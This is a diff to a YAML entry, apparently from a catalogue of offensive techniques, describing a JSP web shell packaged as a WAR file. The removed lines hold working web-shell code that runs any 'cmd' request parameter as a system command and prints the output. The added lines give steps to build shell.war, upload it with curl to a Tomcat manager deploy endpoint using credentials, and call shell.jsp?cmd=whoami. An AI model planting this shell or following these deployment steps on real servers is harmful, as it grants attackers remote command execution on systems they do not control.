@@ -3,31 +3,24 @@ functions:
   shell:
     - description: war web shell (in jsp format)
       code: |
-        <FORM METHOD=GET ACTION='shell.jsp'>
-		<INPUT id='cmd' name='cmd' type=text>
-		<INPUT type=submit value='Run'>
-		</FORM>
-		<script>
-			var input = document.getElementById("cmd");
-			input.focus();
-			input.select();
-		</script>
+        (1) File Structure:
+        ├── shell.jsp
+		└── WEB-INF
+		    └── web.xml
+		web.xml:
+		<?xml version="1.0"?>
+		<!DOCTYPE web-app PUBLIC
+		"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
+		"http://java.sun.com/dtd/web-app_2_3.dtd">
+		<web-app>
+		  <welcome-file-list>
+		    <welcome-file>shell.jsp</welcome-file>
+		  </welcome-file-list>
+		</web-app>
 
-		<%@ page import="java.io.*" %>
-		<%
-		   String cmd = request.getParameter("cmd");
-		   String output = "";
-		   if(cmd != null) {
-		      String s = null;
-		      try {
-		         Process p = Runtime.getRuntime().exec(cmd,null,null);
-		         BufferedReader sI = new BufferedReader(new
-		InputStreamReader(p.getInputStream()));
-		         while((s = sI.readLine()) != null) { output += s+"</br>"; }
-		      }  catch(IOException e) {   e.printStackTrace();   }
-		   }
-		%>
-		<pre><%=output %></pre>
+        (2) jar -cf shell.war *
+        (3) curl --upload-file shell.war "http://10.10.10.194:8080/manager/text/deploy?path=/{context}&update=true" -u {username}
+        https://{address}/shell.jsp?cmd=whoami
 resources: |
-  https://raw.githubusercontent.com/MidnightSeer/scripts/master/php_web_shell.php
+  https://raw.githubusercontent.com/MidnightSeer/scripts/master/shell.jsp
 ---
